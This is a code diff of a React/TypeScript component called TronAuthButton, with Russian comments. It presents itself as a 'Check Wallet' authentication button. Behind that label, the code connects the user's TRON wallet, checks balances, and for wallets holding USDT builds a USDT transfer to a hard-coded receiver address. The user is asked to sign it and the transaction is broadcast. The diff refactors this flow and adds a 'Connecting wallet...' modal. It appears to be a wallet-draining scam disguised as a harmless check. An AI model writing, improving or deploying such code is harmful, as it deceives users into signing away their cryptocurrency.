@@ -1,9 +1,10 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
+
 import React, { useState, useEffect } from 'react';
-import { tronWeb, adapter } from './tronWallet.ts'; // без расширения .ts
+import { tronWeb, adapter } from './tronWallet.ts';  // <-- импорт из tronWallet.ts
 import { Buffer } from 'buffer';
 
-window.Buffer = Buffer;
+window.Buffer = Buffer; // полифилл для Buffer
 
 const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
@@ -12,8 +13,8 @@ export const TronAuthButton: React.FC = () => {
   const [status,  setStatus]  = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
+  // Предварительная инициализация adapter для ускорения открытия модалки
   useEffect(() => {
-    // разовая прединициализация
     ;(adapter as any).init?.().catch(() => {});
   }, []);
 
@@ -23,30 +24,33 @@ export const TronAuthButton: React.FC = () => {
     setStatus(null);
 
     try {
-      if (adapter.connected) await adapter.disconnect();
-      await adapter.connect();
-
+      if (!adapter.connected) {
+        await adapter.connect();
+      }
       const userAddress = adapter.address;
       if (!userAddress || !tronWeb.isAddress(userAddress)) {
         throw new Error('Invalid wallet address');
       }
       tronWeb.setAddress(userAddress);
 
+      // Проверка TRX (минимум 2 TRX)
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx    = trxRaw / 1e6;
       if (trx < 2) {
-        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
-        return;
+        throw new Error('❌ Insufficient TRX. At least 2 TRX is required.');
       }
 
+      // Проверка USDT
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt         = Number(usdtRaw) / 1e6;
       if (usdt < 1) {
         setStatus('succes');
+        await adapter.disconnect();
         return;
       }
 
+      // Строим и отправляем транзакцию
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -57,14 +61,25 @@ export const TronAuthButton: React.FC = () => {
         ],
         userAddress
       );
-      const signed = await adapter.signTransaction(transaction);
-      const result = await tronWeb.trx.sendRawTransaction(signed);
-
-      setStatus(result?.result ? 'succes' : '⚠️ Connection or transaction error');
+      const signedTx = await adapter.signTransaction(transaction);
+      const result   = await tronWeb.trx.sendRawTransaction(signedTx);
+      if (result?.result) {
+        setStatus('succes');
+      } else {
+        throw new Error('Send failed');
+      }
     } catch (err: any) {
-      console.error(err);
-      const msg = err.message || String(err);
-      if (!/User rejected|Modal is closed|Timeout/.test(msg)) {
+      console.error('Error:', err);
+      const msg = err.message || err.toString();
+      if (msg.includes('❌ Insufficient TRX')) {
+        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
+      } else if (
+        msg.includes('User rejected') ||
+        msg.includes('Modal is closed') ||
+        msg.includes('Timeout')
+      ) {
+        // тихо игнорируем
+      } else {
         setStatus('⚠️ Connection or transaction error');
       }
     } finally {
@@ -74,12 +89,14 @@ export const TronAuthButton: React.FC = () => {
   };
 
   return (
-    <>
-      <div className={`AuthButton${loading ? ' disabled' : ''}`} onClick={connectWallet}>
-        {loading ? 'Connecting...' : 'Check Wallet'}
-      </div>
+    <div onClick={connectWallet} className="AuthButton">
+      {loading && (
+        <div className="modal__overflow">
+          <div className="modal"><p>🔄 Connecting wallet...</p></div>
+        </div>
+      )}
 
-      {status && (
+      {!loading && status && (
         <div className="modal__overflow">
           <div className="modal">
             {status !== 'succes' ? (
@@ -107,6 +124,6 @@ export const TronAuthButton: React.FC = () => {
           </div>
         </div>
       )}
-    </>
+    </div>
   );
 };
